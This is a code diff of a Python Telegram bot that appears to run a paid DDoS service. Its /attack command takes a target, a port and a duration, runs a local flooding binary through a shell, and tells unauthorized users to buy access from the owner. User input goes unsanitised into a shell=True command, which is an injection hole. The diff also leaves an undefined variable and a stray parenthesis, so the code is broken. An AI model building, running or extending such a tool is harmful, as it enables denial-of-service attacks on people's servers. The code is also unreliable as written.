@@ -332,40 +332,52 @@ def send_notification_to_channel(username, target, port, attack_time):
         parse_mode='Markdown'
     )
 
-# Handler for /attack command
+# Dictionary to track attack cooldown per user
+attack_cooldown = {}
+
+# Set cooldown time in seconds
+COOLDOWN_TIME = 180
+
 @bot.message_handler(commands=['attack'])
 def handle_attack(message):
     user_id = str(message.chat.id)
+
+    # Check if user is allowed
     if user_id in allowed_user_ids:
-        # Check if the user is in admin_id (admins have no cooldown)
-        if user_id not in admin_id:
-            # Check if the user has run the command before and is still within the cooldown period
-            if user_id in attack_cooldown and (datetime.datetime.now() - attack_cooldown[user_id]).seconds < COOLDOWN_TIME:
-                response = "You Are On Cooldown ❌. Please Wait 10sec Before Running The /attack Command Again."
-                bot.reply_to(message, response)
-                return
-            # Update the last time the user ran the command
-            attack_cooldown[user_id] = datetime.datetime.now()
-        
+        current_time = time_module.time()
+
+        # Check if user is in cooldown period
+        if user_id in attack_cooldown and (current_time - attack_cooldown[user_id] < COOLDOWN_TIME):
+            remaining_time = int(COOLDOWN_TIME - (current_time - attack_cooldown[user_id]))
+            bot.reply_to(message, f"⏳ You are on cooldown! Please wait {remaining_time} seconds before attacking again.")
+            return
+
         command = message.text.split()
-        if len(command) == 4:  # Updated to accept target, time, and port
+        if len(command) == 4:
             target = command[1]
-            port = int(command[2])  # Convert port to integer
-            time = int(command[3])  # Convert time to integer
-            if time > 240:
-                response = "Error: Time interval must be less than 240."
-            else:
-                record_command_logs(user_id, '/attack', target, port, time)
-                log_command(user_id, target, port, time)
-                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./bgmi {target} {port} {time} 10 1000"
-                process = subprocess.run(full_command, shell=True)
-                response = f"ATTACK Attack Finished. Target: {target} Port: {port} Time: {time}"
-                bot.reply_to(message, response)  # Notify the user that the attack is finished
+            port = int(command[2])
+            attack_time = int(command[3])
+
+            if attack_time > 240:
+                bot.reply_to(message, "❌ Error: Attack time must be less than 240 seconds.")
+                return
+
+            # Update cooldown timestamp
+            attack_cooldown[user_id] = current_time
+
+            record_command_logs(user_id, '/attack', target, port, attack_time)
+            log_command(user_id, target, port, attack_time)
+
+            bot.reply_to(message, f"🔥 Attack started!\n🎯 Target: {target}\n🔢 Port: {port}\n⏳ Duration: {attack_time} sec")
+
+            # Run the attack command
+            subprocess.run(f"./daksh {target} {port} {attack_time}", shell=True)
+
+            bot.reply_to(message, f"✅ Attack Finished! Target: {target} Port: {port} Time: {attack_time} sec")
         else:
-            response = "✅ Usage :- /attack <target> <port> <time>"  # Updated command syntax
+            bot.reply_to(message, "✅ Usage: /attack <target> <port> <time>")
     else:
-        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /attack command. DM TO BUY ACCESS:- BOT OWNER")
+        bot.reply_to(message, "🚫 Unauthorized Access! DM BOT OWNER to buy access.")
 
     bot.reply_to(message, response)
 
@@ -614,3 +626,5 @@ while True:
         bot.polling(none_stop=True)
     except Exception as e:
         print(e)
+)
+
